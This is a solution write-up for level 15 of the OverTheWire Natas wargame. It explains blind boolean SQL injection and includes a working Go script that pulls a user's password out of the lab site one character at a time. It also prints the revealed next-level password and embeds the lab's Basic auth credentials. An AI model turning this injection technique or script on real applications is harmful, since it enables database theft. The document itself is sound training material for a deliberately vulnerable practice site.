# 🚩 OverTheWire: Natas Wargame Solutions - Level 15

**Level 15**
This level requires exploiting a **Blind SQL Injection** vulnerability. Since the application does not print errors or data, we rely on the server's boolean response ("This user exists" or not) to infer data.

We target the username `natas16` and determine the password character by character using the following injection logic:
`natas16" and substring((SELECT password FROM users WHERE username = "natas16"), 1, 1) BINARY "a" #`
note: Do not forget to write `BINARY` keyword because ithout it, SQL comparisons are case-insensitive, which would result in an incorrect password.

password for next level = `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`

code to solve this level:
```golang
package main

import (
	"context"
	"fmt"
	"sync"
	"net/http"
	"compress/gzip"
	"io"
	"strings"
)
var (

	client   = &http.Client{
	}
	password = make([]rune, 35)
	mu       sync.Mutex
)
func main() {
	chars := "abcdefghijklmnopqrstuvwxyz" + // a-z
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +      // A-Z
	"0123456789"                      // 0-9
	// "!@#$%^&*()-_=+[]{}|;:',.<>?/`~" +  // Symbols (optional)
	// " "                                 // Include space if needed
	var wg sync.WaitGroup
	for i := range password {
		ctx, cancel := context.WithCancel(context.Background())
		for _, ch := range chars {
			wg.Add(1)

			go solve(ctx, i+1, ch, &wg, cancel)
		}
		wg.Wait()
		fmt.Printf("Progress so far: %s\n", string(password))
	}

	fmt.Printf("Final password: %s\n", string(password))
}

func solve(ctx context.Context, pos int, ch rune, wg *sync.WaitGroup, cancel context.CancelFunc) {
	defer wg.Done()
	select {
	case <- ctx.Done():
		return
	default:
	}
	exploit := fmt.Sprintf("natas16\" and substring((SELECT password FROM users WHERE username = \"natas16\"), %d, 1) = binary  '%c' #", pos,ch )
	postData := "username="+exploit
	req, err := http.NewRequest("POST", "http://natas15.natas.labs.overthewire.org", strings.NewReader(postData))
	if err != nil {
		return
	}

	req.Host = "natas15.natas.labs.overthewire.org"
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Origin", "http://natas15.natas.labs.overthewire.org")
	req.Header.Set("Authorization", "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", "http://natas15.natas.labs.overthewire.org/?debug")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Priority", "u=0, i")


	resp, err := client.Do(req.WithContext(ctx))
	if err != nil {
		return
	}
	defer resp.Body.Close()


	var reader io.ReadCloser

	if resp.Header.Get("Content-Encoding") == "gzip" {
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return
		}
		defer reader.Close()
	} else {
		reader = resp.Body
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		return
	}

	if strings.Contains(string(body), "This user exists.") {
		mu.Lock()
		password[pos-1] = ch
		fmt.Printf("done %d, %c\n", pos, ch)
		mu.Unlock()
		cancel()
	}
}
```

- - -